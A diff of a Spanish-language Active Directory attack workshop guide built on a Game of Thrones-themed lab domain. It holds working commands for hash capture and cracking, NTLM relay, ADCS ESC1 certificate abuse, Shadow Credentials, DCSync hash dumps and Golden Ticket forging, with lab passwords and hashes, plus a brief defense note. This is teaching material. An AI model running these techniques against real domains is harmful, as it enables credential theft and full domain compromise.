@@ -105,20 +105,23 @@ Ahora, abrimos nuestra instancia de BloodHound desde la carpeta de `WorkShop2025
 ./BloodHound-linux-x64/BloodHound --no-sandbox
 ```
 
-Queries que podemos correr dentro de BloodHound:
+#### Queries que podemos correr dentro de BloodHound
+
+- Todos los caminos desde un objeto de dominio hacia un objeto computadora del dominio.
 ```bash
 MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
 ```
-
-Todos los usuarios de los dominios:
+- Todos los usuarios de los dominios:
 ```bash
 MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
 ```
 
-ACL de todos los usuarios:
+- ACL de todos los usuarios:
 ```bash
 MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
 ```
+
+> La sección `not tolower(u.name) contains 'vagrant'` es específica del ambiente de laboratorio, solo estamos excluyendo el usuario de automatizaciones.
 
 ---
 ## 4. Ataques de Relaying y Hashes (Solo para ambientes locales, Azure 🔐 no permite este ataque en su ambiente)
@@ -138,7 +141,8 @@ Buscamos los hashes entre los logs de Responder y los movemos a la carpeta de Wo
 cp /usr/share/responder/logs/<nombre_del_archivo>.txt ./responder.hash
 ```
 
-Si capturamos un hash NTLMv2, podemos tratar de crackearlos con:
+Si capturamos un hash NTLM, podemos tratar de crackearlos con:
+> En este caso, se capturó un hash NTLMv1-SSP, por lo que corresponde el tipo de hash 5500
 
 ```bash
 hashcat -m 5500 --force -a 0 responder.hash /usr/share/wordlists/rockyou.txt
@@ -146,7 +150,7 @@ hashcat -m 5500 --force -a 0 responder.hash /usr/share/wordlists/rockyou.txt
 
 **Defensa:**
 - Deshabilitar LLMNR y NetBIOS en todas las máquinas.
-- Usar SMB Signing para evitar el relaying de NTLM.
+- Requerir SMB Signing para evitar el relaying de NTLM.
 
 ### 4.2 NTLM Relay Attack
 Este ataque permite redirigir autenticaciones NTLM capturadas hacia otro sistema.
@@ -174,12 +178,15 @@ proxychains4 -q impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.46
 ---
 ## 5. Ataques de Elevación de Privilegios
 ### 5.1 ADCS - ESC1
-Lanzamos el ataque:
+Buscamos la plantilla vulnerable:
 ```bash
-certipy find -u cersei.lannister -p 'il0vejaime' -dc-ip 192.168.46.10 -debug -vulnerable -stdout
+certipy find -u cersei.lannister -p 'il0vejaime' -dc-ip 192.168.46.10 -vulnerable -stdout
 ```
 
-Vemos que tenemos 1 template que permite la autenticacion de Kerberos:
+Vemos que tenemos una plantilla llamada `ESC1` que permite:
+- La autenticación de clientes (`Client Authentication`)
+- Especificar el usuario del certificado (`Enrollee Supplies Subject`)
+- Que cualquier usuario del dominio pueda enrolar certificados
 
 ![ESC1-Vulnerable](Imagenes/ESC1-Vulnerable.png)
 
@@ -188,7 +195,7 @@ Ya que sabemos que existe un template vulnerable, podemos correr el siguiente co
 certipy req -u cersei.lannister -p 'il0vejaime' -target kingslanding.sevenkingdoms.local -template ESC1 -ca SEVENKINGDOMS-CA -upn administrator@sevenkingdoms.local
 ```
 
-El cual nos solicitara un ticket como el usuario de administrador. Ahora lo utilizamos para revelar el hash del usuario de Administrador en DC01:
+El cual nos solicita un certificado como el usuario de administrador. Ahora lo utilizamos para revelar el hash del usuario de Administrador en DC01:
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip 192.168.46.10
 ```
@@ -200,12 +207,12 @@ secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a5
 
 ### 5.2 Shadow Credentials
 
-Podemos forzar un cambio de password desde el usuario de `tywin.lannister`, con:
+Podemos forzar el cambio de contraseña del usuario `jaime.lannister` con el usuario de `tywin.lannister`, con:
 ```bash
 net rpc password "jaime.lannister" "testing1" -U "sevenkingdoms.local"/"tywin.lannister"%"powerkingftw135" -S 192.168.46.10
 ```
 
-Esto hace que la password sea cambiada al usuario `jaime.lannister`, con el usuario de `jaime.lannister` podemos aplicar el ataque de ShadowCredentials al usuario de `joffrey.baratheon`:
+Con el usuario de `jaime.lannister` podemos aplicar el ataque de ShadowCredentials al usuario de `joffrey.baratheon`:
 
 ```bash
 certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'cersei' -account 'joffrey.baratheon'
@@ -233,10 +240,10 @@ secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.
 secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.46.11 -output north.sevenkingdoms.local-hashes
 ```
 
-Este muestra todos los hashes de todos los usuarios (habilitados o inhabilitados) del active directory.
+Este muestra todos los hashes de todos los usuarios (habilitados y/o inhabilitados) del active directory.
 
 ### 6.2 Golden Ticket 
-Ya que tenemos el admin, y sacamos el nthash del servicio de KRBTGT, que tiene poder para crear nthashes de cualquier tipo, y solo para probar, vamos a generar un ticket del usuario `robert.baratheon` :
+Ya que tenemos el domain admin, y sacamos el nthash del servicio de KRBTGT, que tiene poder para crear nthashes de cualquier tipo, y solo para probar, vamos a generar un ticket del usuario `robert.baratheon` :
 ```bash
 ticketer.py -nthash c1802a1d08b57644a6a1a2ca0b57fbc6 -domain-sid S-1-5-21-1768168739-1086324585-3153665815 -domain SEVENKINGDOMS.LOCAL ROBERT.BARATHEON
 ```
